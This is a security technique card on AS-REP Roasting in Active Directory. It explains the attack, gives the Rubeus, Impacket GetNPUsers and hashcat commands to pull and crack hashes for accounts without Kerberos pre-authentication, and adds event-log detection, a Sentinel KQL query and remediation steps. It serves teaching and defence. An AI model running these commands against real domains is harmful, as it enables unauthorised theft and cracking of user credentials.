# [CA-KERB-002]: AS-REP Roasting Pre-Auth Disabled

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-002 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Kerberos Tickets: AS-REP Roasting (T1558.004)](https://attack.mitre.org/techniques/T1558/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Abuse of the Kerberos AS-REQ protocol. If a user account has "Do not require Kerberos preauthentication" enabled, an attacker can request a Ticket Granting Ticket (TGT) for that user without knowing their password. The response (AS-REP) contains a chunk of data encrypted with the user's password hash, which can be cracked offline.
- **Attack Surface:** User accounts with `DoesNotRequirePreAuth` flag.
- **Business Impact:** **Credential Access**. Can lead to compromise of user accounts without sending a single packet to the user (silent attack).

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Any Valid Domain User (to query LDAP) or none (if usernames are known).
- **Vulnerable Config:** `DONT_REQ_PREAUTH` bit set in UserAccountControl.
- **Tools:**
    - [Rubeus](https://github.com/GhostPack/Rubeus)
    - [Impacket (GetNPUsers.py)](https://github.com/fortra/impacket)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Exploitation (Windows)**
Roast all vulnerable accounts.
```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

**Step 2: Exploitation (Linux)**
```bash
GetNPUsers.py target.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```

**Step 3: Cracking**
Crack the AS-REP hashes (Type 18200).
```bash
hashcat -m 18200 -a 0 hashes.txt rockyou.txt
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4768 | Ticket Encryption Type: `0x17` (RC4), PreAuthType: `0` (None). |

#### 5.2 Sentinel (KQL)
```kusto
SecurityEvent
| where EventID == 4768
| where PreAuthType == 0
| where TicketEncryptionType == "0x17"
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Configuration:** Audit all accounts and uncheck "Do not require Kerberos preauthentication" in AD Users & Computers (Account Tab).
*   **Monitoring:** Alert on any modification to `UserAccountControl` that enables this bit.

## 7. ATTACK CHAIN
> **Preceding Technique:** [REC-AD-003] (Enumeration)
> **Next Logical Step:** [LAT-AD-001]
